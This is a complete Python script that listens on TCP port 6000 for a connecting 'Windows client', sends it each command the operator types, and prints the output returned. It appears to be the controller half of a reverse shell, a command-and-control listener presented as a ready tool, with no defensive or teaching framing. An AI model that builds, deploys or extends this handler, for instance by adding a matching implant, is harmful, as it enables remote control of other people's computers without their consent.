import socket
import threading
import sys
import os
import platform

HOST = "0.0.0.0"
PORT = 6000  # port to listen on

def receive_output(conn):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors='ignore'))
            sys.stdout.flush()
    except:
        pass

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow immediate reuse of the port
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Waiting for Windows client on {HOST}:{PORT} ...")

    while True:
        conn, addr = server.accept()
        print(f"[+] Windows client connected: {addr}")
        threading.Thread(target=receive_output, args=(conn,), daemon=True).start()

        try:
            while True:
                cmd = sys.stdin.readline()
                if not cmd:
                    break
                # Handle cls locally
                if cmd.lower().strip() == "cls":
                    os.system("cls" if platform.system() == "Windows" else "clear")
                    continue
                conn.sendall(cmd.encode())
        except KeyboardInterrupt:
            print("\n[!] Closing connection")
            conn.close()
            break

if __name__ == "__main__":
    main()
